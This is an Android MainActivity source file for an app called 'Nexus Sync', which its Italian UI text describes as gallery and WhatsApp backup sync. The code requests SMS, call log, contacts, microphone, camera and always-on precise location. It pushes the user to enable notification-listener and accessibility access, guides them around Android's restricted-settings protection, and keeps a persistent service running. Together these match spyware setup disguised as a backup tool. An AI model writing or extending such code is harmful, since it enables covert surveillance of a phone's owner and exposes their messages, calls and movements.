package com.nexus.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERM_REQUEST = 100;
    private static final int TREE_REQUEST = 101;

    @SuppressLint("InlinedApi")
    private String[] PERMISSIONS = {
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView tvDevice = findViewById(R.id.tv_device);
        TextView tvServer = findViewById(R.id.tv_server);
        tvDevice.setText("La galleria si sincronizza automaticamente dalla libreria Android.");
        tvServer.setText("La cartella extra serve solo per backup WhatsApp/file specifici.");

        Button btnNotif = findViewById(R.id.btn_notif);
        Button btnAccess = findViewById(R.id.btn_access);
        Button btnBattery = findViewById(R.id.btn_battery);
        Button btnSd = findViewById(R.id.btn_sd);
        Button btnLocation = findViewById(R.id.btn_location);

        btnNotif.setOnClickListener(v -> {
            Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(i);
        });

        btnAccess.setOnClickListener(v -> showAccessibilityGuide());

        btnSd.setOnClickListener(v -> {
            Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION |
                Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION |
                Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            startActivityForResult(i, TREE_REQUEST);
        });

        btnBattery.setOnClickListener(v -> requestBatteryOptimizationExemption());

        btnLocation.setOnClickListener(v -> {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
            startActivity(i);
            android.widget.Toast.makeText(this,
                "Apri Autorizzazioni → Posizione → Consenti sempre e attiva Posizione precisa",
                android.widget.Toast.LENGTH_LONG).show();
        });

        requestPermissions();
        RecoveryScheduler.schedule(this);
        startNexusService();
        updatePermStatus();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updatePermStatus();
    }

    private void updatePermStatus() {
        TextView tv = findViewById(R.id.tv_perms);
        boolean notifOk = isNotificationListenerEnabled();
        boolean accessOk = isAccessibilityEnabled();
        tv.setText(
            (notifOk ? "✓" : "✗") + " Notifiche   " +
            (accessOk ? "✓" : "✗") + " Accessibilità\n" +
            (hasLocationPerm() ? "✓" : "✗") + " GPS   " +
            (hasBackgroundLocation() ? "✓" : "✗") + " GPS sempre\n" +
            (hasPerm(Manifest.permission.RECORD_AUDIO) ? "✓" : "✗") + " Audio   " +
            (hasPerm(Manifest.permission.READ_SMS) ? "✓" : "✗") + " SMS\n" +
            (ExternalTreeSync.hasTree(this) ? "✓" : "✗") + " Cartella backup/extra autorizzata"
        );
        TextView tvStatus = findViewById(R.id.tv_status);
        tvStatus.setText(notifOk && accessOk ? "● Nexus Attivo" : "○ Nexus — Permessi Mancanti");
    }

    private void requestPermissions() {
        List<String> missing = new ArrayList<>();
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            if (!hasPerm(Manifest.permission.READ_MEDIA_IMAGES)) missing.add(Manifest.permission.READ_MEDIA_IMAGES);
            if (!hasPerm(Manifest.permission.READ_MEDIA_VIDEO)) missing.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else if (!hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE)) {
            missing.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERM_REQUEST);
        }
    }

    private void startNexusService() {
        Intent i = new Intent(this, NexusService.class);
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception e) {
            android.util.Log.e("Nexus", "Impossibile avviare il servizio", e);
        }
    }

    @SuppressLint("BatteryLife")
    private void requestBatteryOptimizationExemption() {
        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        i.setData(Uri.parse("package:" + getPackageName()));
        startActivity(i);
    }

    private boolean hasPerm(String perm) {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasLocationPerm() {
        return hasPerm(Manifest.permission.ACCESS_FINE_LOCATION);
    }

    private boolean hasBackgroundLocation() {
        return android.os.Build.VERSION.SDK_INT < 29 ||
            hasPerm(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
    }

    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }

    private boolean isAccessibilityEnabled() {
        try {
            int enabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (enabled == 1) {
                String services = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                return services != null && services.contains(getPackageName());
            }
        } catch (Exception e) {}
        return false;
    }

    private void showAccessibilityGuide() {
        if (isAccessibilityEnabled()) {
            new android.app.AlertDialog.Builder(this)
                .setTitle("Accessibilità attiva")
                .setMessage("Nexus Sync risulta già abilitato nelle impostazioni di Accessibilità.")
                .setPositiveButton("OK", null).show();
            return;
        }
        android.app.AlertDialog.Builder dialog = new android.app.AlertDialog.Builder(this)
            .setTitle("Abilita Accessibilità")
            .setMessage(RestrictedSettingsGuide.isApplicable(android.os.Build.VERSION.SDK_INT)
                ? RestrictedSettingsGuide.instructions()
                : "Apri Accessibilità e abilita Nexus Sync.")
            .setNegativeButton("Annulla", null)
            .setNeutralButton("Apri Accessibilità", (d, which) ->
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        if (RestrictedSettingsGuide.isApplicable(android.os.Build.VERSION.SDK_INT)) {
            dialog.setPositiveButton("Apri Info applicazione", (d, which) -> {
                Intent info = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName()));
                startActivity(info);
            });
        }
        dialog.show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == TREE_REQUEST && resultCode == RESULT_OK && data != null && data.getData() != null) {
            Uri tree = data.getData();
            try {
                getContentResolver().takePersistableUriPermission(tree, Intent.FLAG_GRANT_READ_URI_PERMISSION);
                ExternalTreeSync.saveTree(this, tree);
                updatePermStatus();
            } catch (SecurityException e) {
                android.widget.Toast.makeText(this, "Permesso SD non concesso", android.widget.Toast.LENGTH_LONG).show();
            }
        }
    }
}
